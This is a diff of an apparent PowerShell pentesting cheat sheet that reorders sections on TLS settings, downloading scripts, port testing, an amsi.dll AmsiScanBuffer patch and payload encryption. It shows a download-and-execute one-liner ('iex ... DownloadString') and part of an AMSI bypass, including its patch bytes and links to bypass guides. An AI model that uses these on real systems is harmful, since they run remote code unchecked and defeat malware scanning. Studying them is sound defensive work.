@@ -1,40 +1,3 @@
-# Table of Contents
-- [Enable support of TLS 1.2](#enable-support-of-tls-12)
-- [Download a script from an HTTP server](#download-a-script-from-an-http-server)
-- [Test on open/close port](#test-on-openclose-port)
-- [Patching amsi.dll AmsiScanBuffer by rasta-mouse](#patching-amsidll-amsiscanbuffer-by-rasta-mouse)
-- [Payload encryption/decryption](#payload-encryptiondecryption)
-  * [Encryption (not secure)](#encryption-not-secure)
-  * [Decryption](#decryption)
-- [How to grep in PowerShell](#how-to-grep-in-powershell)
-
-# Enable support of TLS 1.2
-```powershell
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-```
-
-# Download a script from an HTTP server
-```powershell
-iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/microsoft/ExPerfAnalyzer/main/ExPerfAnalyzer.ps1')
-```
-
-# Test on open/close port
-```powershell
-Test-NetConnection -Port 389 -InformationLevel "Detailed" <ip> 
-```
-
-## Use a data structure for frequently used options
-```powershell
-$Parameters = @{
-	"Port" = "389"
-	"InformationLevel" = "Detailed"
-	"ComputerName" = "localhost"
-}
-Test-NetConnection @Parameters
-```
-
-- [Test-NetConnection](https://docs.microsoft.com/en-us/powershell/module/nettcpip/test-netconnection)
-
 # Patching amsi.dll AmsiScanBuffer by rasta-mouse
 ```powershell
 $Win32 = @"
@@ -70,6 +33,32 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 - [A Detailed Guide on AMSI Bypass](https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/)
 - [Small modification to Rastemouse's AmsiScanBuffer bypass to use bytes.](https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998)
 
+# Enable support of TLS 1.2
+```powershell
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+```
+
+# Download a script from an HTTP server
+```powershell
+iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/microsoft/ExPerfAnalyzer/main/ExPerfAnalyzer.ps1')
+```
+
+# Test on open/close port
+```powershell
+Test-NetConnection -Port 389 -InformationLevel "Detailed" <ip> 
+```
+
+## Use a data structure for frequently used options
+```powershell
+$Parameters = @{
+	"Port" = "389"
+	"InformationLevel" = "Detailed"
+	"ComputerName" = "localhost"
+}
+Test-NetConnection @Parameters
+```
+
+- [Test-NetConnection](https://docs.microsoft.com/en-us/powershell/module/nettcpip/test-netconnection)
 
 # Payload encryption/decryption
 ## Encryption (cryptographically insecure)
